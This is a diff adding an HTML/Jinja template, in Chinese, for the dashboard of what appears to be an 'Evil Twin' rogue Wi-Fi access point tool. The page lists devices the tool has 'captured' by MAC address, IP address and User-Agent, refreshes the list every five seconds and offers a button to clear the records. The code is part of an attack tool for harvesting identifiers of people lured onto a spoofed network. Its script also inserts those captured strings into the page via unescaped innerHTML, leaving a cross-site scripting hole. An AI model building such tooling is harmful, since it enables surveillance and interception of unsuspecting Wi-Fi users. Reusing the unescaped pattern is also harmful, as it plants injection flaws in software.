@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>MAC地址记录 - Evil Twin</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { color: #e94560; margin-bottom: 20px; }
+        table { width: 100%; border-collapse: collapse; background: #16213e; border-radius: 10px; overflow: hidden; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #0f3460; }
+        th { background: #0f3460; color: #e94560; }
+        .mac { font-family: monospace; font-weight: bold; color: #4ecdc4; }
+        .btn { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        .nav-link { color: #4ecdc4; text-decoration: none; margin-right: 15px; }
+        .ua { font-size: 11px; color: #888; max-width: 250px; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>️ 捕获的设备MAC地址</h1>
+        <div style="margin-bottom: 15px;">
+            <a href="/" class="nav-link">← 返回首页</a>
+            <button class="btn" onclick="clearAll()">️ 清空所有记录</button>
+        </div>
+        
+        <table id="mac_table">
+            <thead>
+                <tr><th>ID</th><th>MAC地址</th><th>IP地址</th><th>User-Agent</th><th>捕获时间</th></tr>
+            </thead>
+            <tbody id="mac_body">
+                {% for m in macs %}
+                <tr>
+                    <td>{{ m.id }}</td>
+                    <td class="mac">{{ m.mac_address }}</td>
+                    <td>{{ m.ip_address or '未知' }}</td>
+                    <td class="ua">{{ m.user_agent or '未知' }}</td>
+                    <td>{{ m.captured_at }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    
+    <script>
+        async function loadMacs() {
+            const response = await fetch('/api/macs');
+            const macs = await response.json();
+            const tbody = document.getElementById('mac_body');
+            tbody.innerHTML = '';
+            macs.forEach(m => {
+                const row = tbody.insertRow();
+                row.insertCell(0).innerText = m.id;
+                row.insertCell(1).innerHTML = `<span class="mac">${m.mac_address}</span>`;
+                row.insertCell(2).innerText = m.ip_address || '未知';
+                row.insertCell(3).innerHTML = `<div class="ua">${m.user_agent || '未知'}</div>`;
+                row.insertCell(4).innerText = m.captured_at;
+            });
+        }
+        
+        async function clearAll() {
+            if (confirm('确定要清空所有MAC记录吗？')) {
+                await fetch('/api/macs', { method: 'DELETE' });
+                loadMacs();
+            }
+        }
+        
+        setInterval(loadMacs, 5000);
+    </script>
+</body>
+</html>
